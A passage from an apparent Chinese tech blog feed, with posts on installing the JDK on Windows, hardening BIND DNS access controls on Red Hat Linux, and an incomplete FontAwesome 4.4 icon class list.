      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>JDK 是 Java 语言的软件开发工具包，主要用于移动设备、嵌入式设备上的 java 应用程序。JDK 是整个 java 开发的核心，它包含了 JAVA 的运行环境，JAVA 工具和 JAVA 基础的类库。这里将介绍在 Windows 下JDK 的安装和环境变量的配置<a id="more"></a></p><h1 id="安装-JDK"><a href="#安装-JDK" class="headerlink" title="安装 JDK"></a>安装 JDK</h1><p>安装 JDK 时。第一次是安装 jdk ，第二次是安装 jre 。建议两个都安装在同一个 java 文件夹中的不同文件夹中。（不能都安装在 java 文件夹的根目录下，jdk 和 jre 安装在同一文件夹会出错）。</p><p><code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/jdk-1.png" alt="JDK 安装"></p><p>安装 <code>jdk</code> 随意选择目录 只需把默认安装目录 <code>\java</code> 之前的目录修改即可<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/jdk-2.png" alt="JDK 安装"></p><p>安装 <code>jre</code> → <code>更改</code> → <code>\java</code> 之前目录和安装 <code>jdk</code> 目录相同即可<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/jdk-3.png" alt="JDK 安装"></p><blockquote><p>注：若无安装目录要求，可全默认设置。无需做任何修改，两次均直接点下一步。</p></blockquote><h1 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h1><p>安装完 JDK 后配置环境变量，依次选择：<code>计算机</code> → <code>属性</code> → <code>高级系统设置</code> → <code>高级</code> → <code>环境变量</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/jdk-4.png" alt="JDK 环境变量配置"></p><h2 id="指定-JAVA-程序目录"><a href="#指定-JAVA-程序目录" class="headerlink" title="指定 JAVA 程序目录"></a>指定 JAVA 程序目录</h2><p>新建 <code>JAVA_HOME</code> 变量 。变量值填写 <code>jdk</code> 的安装目录（本人是 <code>D:\Java\jdk</code>)<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/jdk-5.png" alt="JDK 环境变量配置"></p><h2 id="修改-Path-变量"><a href="#修改-Path-变量" class="headerlink" title="修改 Path 变量"></a>修改 Path 变量</h2><p>在变量值最后输入 <code>%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</code> （注意原来 <code>Path</code> 的变量值末尾有没有 <code>;</code> 号，如果没有，先输入 <code>;</code> 号再输入上面的代码）<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/jdk-6.png" alt="JDK 环境变量配置"></p><h2 id="新建-CLASSPATH-变量"><a href="#新建-CLASSPATH-变量" class="headerlink" title="新建 CLASSPATH 变量"></a>新建 CLASSPATH 变量</h2><p>在变量值中输入 <code>.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar</code> （注意最前面有一点）<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/jdk-7.png" alt="JDK 环境变量配置"></p><p>到此系统的环境变量已经全部配置完毕。</p><h1 id="检验安装完成"><a href="#检验安装完成" class="headerlink" title="检验安装完成"></a>检验安装完成</h1><p>运行 cmd 输入 <code>java -version</code> （java 和 -version 之间有空格）。 若如图所示，显示版本信息，则说明安装和配置成功。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/jdk-8.png" alt="JDK 环境变量配置"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Software </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 服务配置笔记（六）：DNS 服务安全配置]]></title>
      <url>/2016/09/liunx-service-dns/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>这篇是 Liunx 的服务配置笔记系列第五篇，这一篇将具体介绍 Red Hat Liunx 下 DNS 服务的安全配置。所谓 DNS 就是一个域名解析服务器，其中 DNS 还包含正向解析和反向解析<a id="more"></a></p><h1 id="服务的安装"><a href="#服务的安装" class="headerlink" title="服务的安装"></a>服务的安装</h1><h2 id="创建挂载目录"><a href="#创建挂载目录" class="headerlink" title="创建挂载目录"></a>创建挂载目录</h2><p><code>For Example:</code></p><pre><code class="bash">mkdir -p /mnt/cdrom
</code></pre><h2 id="挂在光盘"><a href="#挂在光盘" class="headerlink" title="挂在光盘"></a>挂在光盘</h2><p><code>For Example:</code></p><pre><code class="bash">mount /dev/cdrom /mnt/cdrom
</code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>For Example:</code></p><pre><code class="bash">cd /mnt/cdrom/Server
rpm -ivh bind-9.3.6-4.P1.el5_4.2.i386.rpm
rpm -ivh caching-namedserver-9.3.6-4.P1.el5_4.2.i386.rpm
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-dns-1.png" alt="DNS"></p><h2 id="复制模板配置文件"><a href="#复制模板配置文件" class="headerlink" title="复制模板配置文件"></a>复制模板配置文件</h2><p><code>For Example:</code></p><pre><code class="bash">cd /etc/
cp -p named.caching-nameserver.conf named.conf
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-dns-2.png" alt="DNS"></p><blockquote><p>复制的时候，建议带上 <code>-p</code> 选项，否则不能使用该文件，如果忘记加上 <code>-p</code> 选项，不要紧，使用以下命令还可以挽救。</p></blockquote><pre><code class="bash">chown named:named named.conf
chown named:named named.zones
</code></pre><h1 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h1><h2 id="限制递归查询功能"><a href="#限制递归查询功能" class="headerlink" title="限制递归查询功能"></a>限制递归查询功能</h2><blockquote><p>默认没有这个功能，需要手动添加。递归查询指 一般客户机和服务器之间属 递归查询 ，即当客户机向 DNS 服务器发 出请求后,若 DNS 服务器本身不能解析,则会向另外的 DNS 服务 器发出查询请求，得到结果后转交给客户机。<br><br>这个选项，即可填 IP 地址，也可以填网络段，当然也可以填 any（所有）。</p></blockquote><p>修改主配置文件，<code>Example Configuration:</code></p><pre><code class="bash">allow-recursion { 192.168.199.0/24; };     # 限制网段查询
allow-recursion { 192.168.199.2; };        # 限制 IP 查询
allow-recursion { any; };                  # 所有的都可以查询
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-dns-3.png" alt="DNS"></p><h2 id="限制查询"><a href="#限制查询" class="headerlink" title="限制查询"></a>限制查询</h2><p><code>Default Configuration:</code></p><pre><code class="bash">allow-query { localhost; };
</code></pre><blockquote><p>allow-query 配置项用来设置允许 DNS 查询的客户端地址，默认的客户端地址为本机。这里可以设置为某个网段、所有、具体的某台主机三种情况。</p></blockquote><p>修改主配置文件，<code>Example Configuration:</code></p><pre><code class="bash">allow-query { 192.168.199.0/24; };     # 限制网段查询
allow-query { 192.168.199.2; };        # 限制 IP 查询
allow-query { any; };                  # 所有的都可以查询
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-dns-4.png" alt="DNS"></p><h2 id="限制区传送"><a href="#限制区传送" class="headerlink" title="限制区传送"></a>限制区传送</h2><blockquote><p>默认没有这个功能，需要手动添加。如果没有限制区传送，那么 DNS 服务器允许对任何人都进行区域传输，因此网络架构中的主机名、主机 IP 列表、路由器名和路由 IP 列表，甚至包括各主机所在的位置和硬件配置等情况都很容易被入侵者得到在 DNS 配置文件中通过设置来限制允许区传送的主机，从一定程度上能减轻信息泄漏。</p></blockquote><p>修改主配置文件，<code>Example Configuration:</code></p><pre><code class="bash">allow-transfer{ 192.168.199.0/24; };      # 限制网段查询
allow-transfer { 192.168.199.2; };        # 限制 IP 查询
allow-transfer { any; };                  # 所有的都可以查询
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-dns-5.png" alt="DNS"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Protocol </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FontAwesome 图标样式 CSS 参考清单]]></title>
      <url>/2016/09/font-awesome-icons/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>在网站开发中多多少少都会使用到图标，这也是 HTML5 发展以来最具有特色的地方，也就是说，我们可以完全可以抛弃用图片当图标，现在就可以使用 CSS 样式加上字体库实现图标的引用<a id="more"></a></p><h1 id="引入使用"><a href="#引入使用" class="headerlink" title="引入使用"></a>引入使用</h1><link href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet"><style>.fa-icons{display:flex;flex-wrap:wrap}.fa-icons span{display:inline-flex;flex-direction:row;margin:1rem;justify-content:center;align-items:center}.fa-icons i{font-size:2rem;margin:.5rem}</style><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>使用图标之前需要引入 CSS 文件，这里选用 <code>FontAwesome 4.4.0</code> 版本</p><pre><code class="html">&lt;link href=&quot;//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css&quot; rel=&quot;stylesheet&quot;&gt;
</code></pre><p>当然，还可以使用离线包，我们可以去官网下载它。<a href="http://fontawesome.io/" target="_blank" rel="external">http://fontawesome.io/</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre><code class="html">&lt;i class=&quot;fa fa-home&quot;&gt;&lt;/i&gt;
</code></pre><blockquote><p>更多使用方法请查看官方例子 <a href="http://fontawesome.io/examples/#animated" target="_blank" rel="external">http://fontawesome.io/examples/#animated</a></p></blockquote><h1 id="图标-CSS-清单"><a href="#图标-CSS-清单" class="headerlink" title="图标 CSS 清单"></a>图标 CSS 清单</h1><h2 id="66-New-Icons-in-4-4"><a href="#66-New-Icons-in-4-4" class="headerlink" title="66 New Icons in 4.4"></a>66 New Icons in 4.4</h2><div class="fa-icons"><span><i class="fa fa-500px"></i><br><code>.fa-500px</code></span><br><span><i class="fa fa-amazon"></i><br><code>.fa-amazon</code></span><br><span><i class="fa fa-balance-scale"></i><br><code>.fa-balance-scale</code></span><br><span><i class="fa fa-battery-0"></i><br><code>.fa-battery-0</code></span><br><span><i class="fa fa-battery-1"></i><br><code>.fa-battery-1</code></span><br><span><i class="fa fa-battery-2"></i><br><code>.fa-battery-2</code></span><br><span><i class="fa fa-battery-3"></i><br><code>.fa-battery-3</code></span><br><span><i class="fa fa-battery-4"></i><br><code>.fa-battery-4</code></span><br><span><i class="fa fa-battery-empty"></i><br><code>.fa-battery-empty</code></span><br><span><i class="fa fa-battery-full"></i><br><code>.fa-battery-full</code></span><br><span><i class="fa fa-battery-half"></i><br><code>.fa-battery-half</code></span><br><span><i class="fa fa-battery-quarter"></i><br><code>.fa-battery-quarter</code></span><br><span><i class="fa fa-battery-three-quarters"></i><br><code>.fa-battery-three-quarters</code></span><br><span><i class="fa fa-black-tie"></i><br><code>.fa-black-tie</code></span><br><span><i class="fa fa-calendar-check-o"></i><br><code>.fa-calendar-check-o</code></span><br><span><i class="fa fa-calendar-minus-o"></i><br><code>.fa-calendar-minus-o</code></span><br><span><i class="fa fa-calendar-plus-o"></i><br><code>.fa-calendar-plus-o</code></span><br><span><i class="fa fa-calendar-times-o"></i><br><code>.fa-calendar-times-o</code></span><br><span><i class="fa fa-cc-diners-club"></i><br><code>.fa-cc-diners-club</code></span><br><span><i class="fa fa-cc-jcb"></i><br><code>.fa-cc-jcb</code></span><br><span><i class="fa fa-chrome"></i><br><code>.fa-chrome</code></span><br><span><i class="fa fa-clone"></i><br><code>.fa-clone</code></span><br><span><i class="fa fa-commenting"></i><br><code>.fa-commenting</code></span><br><span><i class="fa fa-commenting-o"></i><br><code>.fa-commenting-o</code></span><br><span><i class="fa fa-contao"></i><br><code>.fa-contao</code></span><br><span><i class="fa fa-creative-commons"></i><br><code>.fa-creative-commons</code></span><br><span><i class="fa fa-expeditedssl"></i><br><code>.fa-expeditedssl</code></span><br><span><i class="fa fa-firefox"></i><br><code>.fa-firefox</code></span><br><span><i class="fa fa-fonticons"></i><br><code>.fa-fonticons</code></span><br><span><i class="fa fa-genderless"></i><br><code>.fa-genderless</code></span><br><span><i class="fa fa-get-pocket"></i><br><code>.fa-get-pocket</code></span><br><span><i class="fa fa-gg"></i><br><code>.fa-gg</code></span><br><span><i class="fa fa-gg-circle"></i><br><code>.fa-gg-circle</code></span><br><span><i class="fa fa-hand-grab-o"></i><br><code>.fa-hand-grab-o</code></span><br><span><i class="fa fa-hand-lizard-o"></i><br><code>.fa-hand-lizard-o</code></span><br><span><i class="fa fa-hand-paper-o"></i><br><code>.fa-hand-paper-o</code></span><br><span><i class="fa fa-hand-peace-o"></i><br><code>.fa-hand-peace-o</code></span><br><span><i class="fa fa-hand-pointer-o"></i><br><code>.fa-hand-pointer-o</code></span><br><span><i class="fa fa-hand-rock-o"></i><br><code>.fa-hand-rock-o</code></span><br><span><i class="fa fa-hand-scissors-o"></i><br><code>.fa-hand-scissors-o</code></span><br><span><i class="fa fa-hand-spock-o"></i><br><code>.fa-hand-spock-o</code></span><br><span><i class="fa fa-hand-stop-o"></i><br><code>.fa-hand-stop-o</code></span><br><span><i class="fa fa-hourglass"></i><br><code>.fa-hourglass</code></span><br><span><i class="fa fa-hourglass-1"></i><br><code>.fa-hourglass-1</code></span><br><span><i class="fa fa-hourglass-2"></i><br><code>.fa-hourglass-2</code></span><br><span><i class="fa fa-hourglass-3"></i><br><code>.fa-hourglass-3</code></span><br><span><i class="fa fa-hourglass-end"></i><br><code>.fa-hourglass-end</code></span><br><span><i class="fa fa-hourglass-half"></i><br><code>.fa-hourglass-half</code></span><br><span><i class="fa fa-hourglass-o"></i><br><code>.fa-hourglass-o</code></span><br><span><i class="fa fa-hourglass-start"></i><br><code>.fa-hourglass-start</code></span><br><span><i class="fa fa-houzz"></i><br><code>.fa-houzz</code></span><br><span><i class="fa fa-i-cursor"></i><br><code>.fa-i-cursor</code></span><br><span><i class="fa fa-industry"></i><br><code>.fa-industry</code></span><br><span><i class="fa fa-internet-explorer"></i><br><code>.fa-internet-explorer</code></span><br><span><i class="fa fa-map"></i><br><code>.fa-map</code></span><br><span><i class="fa fa-map-o"></i><br><code>.fa-map-o</code></span><br><span><i class="fa fa-map-pin"></i><br><code>.fa-map-pin</code></span><br><span><i class="fa fa-map-signs"></i><br><code>.fa-map-signs</code></span><br><span><i class="fa fa-mouse-pointer"></i><br><code>.fa-mouse-pointer</code></span><br><span><i class="fa fa-object-group"></i><br><code>.fa-object-group</code></span><br><span><i class="fa fa-object-ungroup"></i><br><code>.fa-object-ungroup</code></span><br><span><i class="fa fa-odnoklassniki"></i><br><code>.fa-odnoklassniki</code></span><br><span><i class="fa fa-odnoklassniki-square"></i><br><code>.fa-odnoklassniki-square</code></span><br><span><i class="fa fa-opencart"></i><br><code>.fa-opencart</code></span><br><span><i class="fa fa-opera"></i><br><code>.fa-opera</code></span><br><span><i class="fa fa-optin-monster"></i><br><code>.fa-optin-monster</code></span><br><span><i class="fa fa-registered"></i><br><code>.fa-registered</code></span><br><span><i class="fa fa-safari"></i><br><code>.fa-safari</code></span><br><span><i class="fa fa-sticky-note"></i><br><code>.fa-sticky-note</code></span><br><span><i class="fa fa-sticky-note-o"></i><br><code>.fa-sticky-note-o</code></span><br><span><i class="fa fa-television"></i><br><code>.fa-television</code></span><br><span><i class="fa fa-trademark"></i><br><code>.fa-trademark</code></span><br><span><i class="fa fa-tripadvisor"></i><br><code>.fa-tripadvisor</code></span><br><span><i class="fa fa-tv"></i><br><code>.fa-tv</code></span><br><span><i class="fa fa-vimeo"></i><br><code>.fa-vimeo</code></span><br><span><i class="fa fa-wikipedia-w"></i><br><code>.fa-wikipedia-w</code></span><br><span><i class="fa fa-y-combinator"></i><br><code>.fa-y-combinator</code></span><br><span><i class="fa fa-yc"></i><br><code>.fa-yc</code></span></div><h2 id="Web-Application-Icons"><a href="#Web-Application-Icons" class="headerlink" title="Web Application Icons"></a>Web Application Icons</h2><div class="fa-icons"><span><i class="fa fa-adjust"></i><br><code>.fa-adjust</code></span><br><span><i class="fa fa-anchor"></i><br><code>.fa-anchor</code></span><br><span><i class="fa fa-archive"></i><br><code>.fa-archive</code></span><br><span><i class="fa fa-area-chart"></i><br><code>.fa-area-chart</code></span><br><span><i class="fa fa-arrows"></i><br><code>.fa-arrows</code></span><br><span><i class="fa fa-arrows-h"></i><br><code>.fa-arrows-h</code></span><br><span><i class="fa fa-arrows-v"></i><br><code>.fa-arrows-v</code></span><br><span><i class="fa fa-asterisk"></i><br><code>.fa-asterisk</code></span><br><span><i class="fa fa-at"></i><br><code>.fa-at</code></span><br><span><i class="fa fa-automobile"></i><br><code>.fa-automobile</code></span><br><span><i class="fa fa-balance-scale"></i><br><code>.fa-balance-scale</code></span><br><span><i class="fa fa-ban"></i><br><code>.fa-ban</code></span><br><span><i class="fa fa-bank"></i><br><code>.fa-bank</code></span><br><span><i class="fa fa-bar-chart"></i><br><code>.fa-bar-chart</code></span><br><span><i class="fa fa-bar-chart-o"></i><br><code>.fa-bar-chart-o</code></span><br><span><i class="fa fa-barcode"></i><br><code>.fa-barcode</code></span><br><span><i class="fa fa-bars"></i><br><code>.fa-bars</code></span><br><span><i class="fa fa-battery-0"></i><br><code>.fa-battery-0</code></span><br><span><i class="fa fa-battery-1"></i><br><code>.fa-battery-1</code></span><br><span><i class="fa fa-battery-2"></i><br><code>.fa-battery-2</code></span><br><span><i class="fa fa-battery-3"></i><br><code>.fa-battery-3</code></span><br><span><i class="fa fa-battery-4"></i><br><code>.fa-battery-4</code></span><br><span><i class="fa fa-battery-empty"></i><br><code>.fa-battery-empty</code></span><br><span><i class="fa fa-battery-full"></i><br><code>.fa-battery-full</code></span><br><span><i class="fa fa-battery-half"></i><br><code>.fa-battery-half</code></span><br><span><i class="fa fa-battery-quarter"></i><br><code>.fa-battery-quarter</code></span><br><span><i class="fa fa-battery-three-quarters"></i><br><code>.fa-battery-three-quarters</code></span><br><span><i class="fa fa-bed"></i><br><code>.fa-bed</code></span><br><span><i class="fa fa-beer"></i><br><code>.fa-beer</code></span><br><span><i class="fa fa-bell"></i><br><code>.fa-bell</code></span><br><span><i class="fa fa-bell-o"></i><br><code>.fa-bell-o</code></span><br><span><i class="fa fa-bell-slash"></i><br><code>.fa-bell-slash</code></span><br><span><i class="fa fa-bell-slash-o"></i><br><code>.fa-bell-slash-o</code></span><br><span><i class="fa fa-bicycle"></i><br><code>.fa-bicycle</code></span><br><span><i class="fa fa-binoculars"></i><br><code>.fa-binoculars</code></span><br><span><i class="fa fa-birthday-cake"></i><br><code>.fa-birthday-cake</code></span><br><span><i class="fa fa-bolt"></i><br><code>.fa-bolt</code></span><br><span><i class="fa fa-bomb"></i><br><code>.fa-bomb</code></span><br><span><i class="fa fa-book"></i><br><code>.fa-book</code></span><br><span><i class="fa fa-bookmark"></i><br><code>.fa-bookmark</code></span><br><span><i class="fa fa-bookmark-o"></i><br><code>.fa-bookmark-o</code></span><br><span><i class="fa fa-briefcase"></i><br><code>.fa-briefcase</code></span><br><span><i class="fa fa-bug"></i><br><code>.fa-bug</code></span><br><span><i class="fa fa-building"></i><br><code>.fa-building</code></span><br><span><i class="fa fa-building-o"></i><br><code>.fa-building-o</code></span><br><span><i class="fa fa-bullhorn"></i><br><code>.fa-bullhorn</code></span><br><span><i class="fa fa-bullseye"></i><br><code>.fa-bullseye</code></span><br><span><i class="fa fa-bus"></i><br><code>.fa-bus</code></span><br><span><i class="fa fa-cab"></i><br><code>.fa-cab</code></span><br><span><i class="fa fa-calculator"></i><br><code>.fa-calculator</code></span><br><span><i class="fa fa-calendar"></i><br><code>.fa-calendar</code></span><br><span><i class="fa fa-calendar-check-o"></i><br><code>.fa-calendar-check-o</code></span><br><span><i class="fa fa-calendar-minus-o"></i><br><code>.fa-calendar-minus-o</code></span><br><span><i class="fa fa-calendar-o"></i><br><code>.fa-calendar-o</code></span><br><span><i class="fa fa-calendar-plus-o"></i><br><code>.fa-calendar-plus-o</code></span><br><span><i class="fa fa-calendar-times-o"></i><br><code>.fa-calendar-times-o</code></span><br><span><i class="fa fa-camera"></i><br><code>.fa-camera</code></span><br><span><i class="fa fa-camera-retro"></i><br><code>.fa-camera-retro</code></span><br><span><i class="fa fa-car"></i><br><code>.fa-car</code></span><br><span><i class="fa fa-caret-square-o-down"></i><br><code>.fa-caret-square-o-down</code></span><br><span><i class="fa fa-caret-square-o-left"></i><br><code>.fa-caret-square-o-left</code></span><br><span><i class="fa fa-caret-square-o-right"></i><br><code>.fa-caret-square-o-right</code></span><br><span><i class="fa fa-caret-square-o-up"></i><br><code>.fa-caret-square-o-up</code></span><br><span><i class="fa fa-cart-arrow-down"></i><br><code>.fa-cart-arrow-down</code></span><br><span><i class="fa fa-cart-plus"></i><br><code>.fa-cart-plus</code></span><br><span><i class="fa fa-cc"></i><br><code>.fa-cc</code></span><br><span><i class="fa fa-certificate"></i><br><code>.fa-certificate</code></span><br><span><i class="fa fa-check"></i><br><code>.fa-check</code></span><br><span><i class="fa fa-check-circle"></i><br><code>.fa-check-circle</code></span><br><span><i class="fa fa-check-circle-o"></i><br><code>.fa-check-circle-o</code></span><br><span><i class="fa fa-check-square"></i><br><code>.fa-check-square</code></span><br><span><i class="fa fa-check-square-o"></i><br><code>.fa-check-square-o</code></span><br><span><i class="fa fa-child"></i><br><code>.fa-child</code></span><br><span><i class="fa fa-circle"></i><br><code>.fa-circle</code></span><br><span><i class="fa fa-circle-o"></i><br><code>.fa-circle-o</code></span><br><span><i class="fa fa-circle-o-notch"></i><br><code>.fa-circle-o-notch</code></span><br><span><i class="fa fa-circle-thin"></i><br><code>.fa-circle-thin</code></span><br><span><i class="fa fa-clock-o"></i><br><code>.fa-clock-o</code></span><br><span><i class="fa fa-clone"></i><br><code>.fa-clone</code></span><br><span><i class="fa fa-close"></i><br><code>.fa-close</code></span><br><span><i class="fa fa-cloud"></i><br><code>.fa-cloud</code></span><br><span><i class="fa fa-cloud-download"></i><br><code>.fa-cloud-download</code></span><br><span><i class="fa fa-cloud-upload"></i><br><code>.fa-cloud-upload</code></span><br><span><i class="fa fa-code"></i><br><code>.fa-code</code></span><br><span><i class="fa fa-code-fork"></i><br><code>.fa-code-fork</code></span><br><span><i class="fa fa-coffee"></i><br><code>.fa-coffee</code></span><br><span><i class="fa fa-cog"></i><br><code>.fa-cog</code></span><br><span><i class="fa fa-cogs"></i><br><code>.fa-cogs</code></span><br><span><i class="fa fa-comment"></i><br><code>.fa-comment</code></span><br><span><i class="fa fa-comment-o"></i><br><code>.fa-comment-o</code></span><br><span><i class="fa fa-commenting"></i><br><code>.fa-commenting</code></span><br><span><i class="fa fa-commenting-o"></i><br><code>.fa-commenting-o</code></span><br><span><i class="fa fa-comments"></i><br><code>.fa-comments</code></span><br><span><i class="fa fa-comments-o"></i><br><code>.fa-comments-o</code></span><br><span><i class="fa fa-compass"></i><br><code>.fa-compass</code></span><br><span><i class="fa fa-copyright"></i><br><code>.fa-copyright</code></span><br><span><i class="fa fa-creative-commons"></i><br><code>.fa-creative-commons</code></span><br><span><i class="fa fa-credit-card"></i><br><code>.fa-credit-card</code></span><br><span><i class="fa fa-crop"></i><br><code>.fa-crop</code></span><br><span><i class="fa fa-crosshairs"></i><br><code>.fa-crosshairs</code></span><br><span><i class="fa fa-cube"></i><br><code>.fa-cube</code></span><br><span><i class="fa fa-cubes"></i><br><code>.fa-cubes</code></span><br><span><i class="fa fa-cutlery"></i><br><code>.fa-cutlery</code></span><br><span><i class="fa fa-dashboard"></i><br><code>.fa-dashboard</code></span><br><span><i class="fa fa-database"></i><br><code>.fa-database</code></span><br><span><i class="fa fa-desktop"></i><br><code>.fa-desktop</code></span><br><span><i class="fa fa-diamond"></i><br><code>.fa-diamond</code></span><br><span><i class="fa fa-dot-circle-o"></i><br><code>.fa-dot-circle-o</code></span><br><span><i class="fa fa-download"></i><br><code>.fa-download</code></span><br><span><i class="fa fa-edit"></i><br><code>.fa-edit</code></span><br><span><i class="fa fa-ellipsis-h"></i><br><code>.fa-ellipsis-h</code></span><br><span><i class="fa fa-ellipsis-v"></i><br><code>.fa-ellipsis-v</code></span><br><span><i class="fa fa-envelope"></i><br><code>.fa-envelope</code></span><br><span><i class="fa fa-envelope-o"></i><br><code>.fa-envelope-o</code></span><br><span><i class="fa fa-envelope-square"></i><br><code>.fa-envelope-square</code></span><br><span><i class="fa fa-eraser"></i><br><code>.fa-eraser</code></span><br><span><i class="fa fa-exchange"></i><br><code>.fa-exchange</code></span><br><span><i class="fa fa-exclamation"></i><br><code>.fa-exclamation</code></span><br><span><i class="fa fa-exclamation-circle"></i><br><code>.fa-exclamation-circle</code></span><br><span><i class="fa fa-exclamation-triangle"></i><br><code>.fa-exclamation-triangle</code></span><br><span><i class="fa fa-external-link"></i><br><code>.fa-external-link</code></span><br><span><i class="fa fa-external-link-square"></i><br><code>.fa-external-link-square</code></span><br><span><i class="fa fa-eye"></i><br><code>.fa-eye</code></span><br><span><i class="fa fa-eye-slash"></i><br><code>.fa-eye-slash</code></span><br><span><i class="fa fa-eyedropper"></i><br><code>.fa-eyedropper</code></span><br><span><i class="fa fa-fax"></i><br><code>.fa-fax</code></span><br><span><i class="fa fa-feed"></i><br><code>.fa-feed</code></span><br><span><i class="fa fa-female"></i><br><code>.fa-female</code></span><br><span><i class="fa fa-fighter-jet"></i><br><code>.fa-fighter-jet</code></span><br><span><i class="fa fa-file-archive-o"></i><br><code>.fa-file-archive-o</code></span><br><span><i class="fa fa-file-audio-o"></i><br><code>.fa-file-audio-o</code></span><br><span><i class="fa fa-file-code-o"></i><br><code>.fa-file-code-o</code></span><br><span><i class="fa fa-file-excel-o"></i><br><code>.fa-file-excel-o</code></span><br><span><i class="fa fa-file-image-o"></i><br><code>.fa-file-image-o</code></span><br><span><i class="fa fa-file-movie-o"></i><br><code>.fa-file-movie-o</code></span><br><span><i class="fa fa-file-pdf-o"></i><br><code>.fa-file-pdf-o</code></span><br><span><i class="fa fa-file-photo-o"></i><br><code>.fa-file-photo-o</code></span><br><span><i class="fa fa-file-picture-o"></i><br><code>.fa-file-picture-o</code></span><br><span><i class="fa fa-file-powerpoint-o"></i><br><code>.fa-file-powerpoint-o</code></span><br><span><i class="fa fa-file-sound-o"></i><br><code>.fa-file-sound-o</code></span><br><span><i class="fa fa-file-video-o"></i><br><code>.fa-file-video-o</code></span><br><span><i class="fa fa-file-word-o"></i><br><code>.fa-file-word-o</code></span><br><span><i class="fa fa-file-zip-o"></i><br><code>.fa-file-zip-o</code></span><br><span><i class="fa fa-film"></i><br><code>.fa-film</code></span><br><span><i class="fa fa-filter"></i><br><code>.fa-filter</code></span><br><span><i class="fa fa-fire"></i><br><code>.fa-fire</code></span><br><span><i class="fa fa-fire-extinguisher"></i><br><code>.fa-fire-extinguisher</code></span><br><span><i class="fa fa-flag"></i><br><code>.fa-flag</code></span><br><span><i class="fa fa-flag-checkered"></i><br><code>.fa-flag-checkered</code></span><br><span><i class="fa fa-flag-o"></i><br><code>.fa-flag-o</code></span><br><span><i class="fa fa-flash"></i><br><code>.fa-flash</code></span><br><span><i class="fa fa-flask"></i><br><code>.fa-flask</code></span><br><span><i class="fa fa-folder"></i><br><code>.fa-folder</code></span><br><span><i class="fa fa-folder-o"></i><br><code>.fa-folder-o</code></span><br><span><i class="fa fa-folder-open"></i><br><code>.fa-folder-open</code></span><br><span><i class="fa fa-folder-open-o"></i><br><code>.fa-folder-open-o</code></span><br><span><i class="fa fa-frown-o"></i><br><code>.fa-frown-o</code></span><br><span><i class="fa fa-futbol-o"></i><br><code>.fa-futbol-o</code></span><br><span><i class="fa fa-gamepad"></i><br><code>.fa-gamepad</code></span><br><span><i class="fa fa-gavel"></i><br><code>.fa-gavel</code></span><br><span><i class="fa fa-gear"></i><br><code>.fa-gear</code></span><br><span><i class="fa fa-gears"></i><br><code>.fa-gears</code></span><br><span><i class="fa fa-gift"></i><br><code>.fa-gift</code></span><br><span><i class="fa fa-glass"></i><br><code>.fa-glass</code></span><br><span><i class="fa fa-globe"></i><br><code>.fa-globe</code></span><br><span><i class="fa fa-graduation-cap"></i><br><code>.fa-graduation-cap</code></span><br><span><i class="fa fa-group"></i><br><code>.fa-group</code></span><br><span><i class="fa fa-hand-grab-o"></i><br><code>.fa-hand-grab-o</code></span><br><span><i class="fa fa-hand-lizard-o"></i><br><code>.fa-hand-lizard-o</code></span><br><span><i class="fa fa-hand-paper-o"></i><br><code>.fa-hand-paper-o</code></span><br><span><i class="fa fa-hand-peace-o"></i><br><code>.fa-hand-peace-o</code></span><br><span><i class="fa fa-hand-pointer-o"></i><br><code>.fa-hand-pointer-o</code></span><br><span><i class="fa fa-hand-rock-o"></i><br><code>.fa-hand-rock-o</code></span><br><span><i class="fa fa-hand-scissors-o"></i><br><code>.fa-hand-scissors-o</code></span><br><span><i class="fa fa-hand-spock-o"></i><br><code>.fa-hand-spock-o</code></span><br><span><i class="fa fa-hand-stop-o"></i><br><code>.fa-hand-stop-o</code></span><br><span><i class="fa fa-hdd-o"></i><br><code>.fa-hdd-o</code></span><br><span><i class="fa fa-headphones"></i><br><code>.fa-headphones</code></span><br><span><i class="fa fa-heart"></i><br><code>.fa-heart</code></span><br><span><i class="fa fa-heart-o"></i><br><code>.fa-heart-o</code></span><br><span><i class="fa fa-heartbeat"></i><br><code>.fa-heartbeat</code></span><br><span><i class="fa fa-history"></i><br><code>.fa-history</code></span><br><span><i class="fa fa-home"></i><br><code>.fa-home</code></span><br><span><i class="fa fa-hotel"></i><br><code>.fa-hotel</code></span><br><span><i class="fa 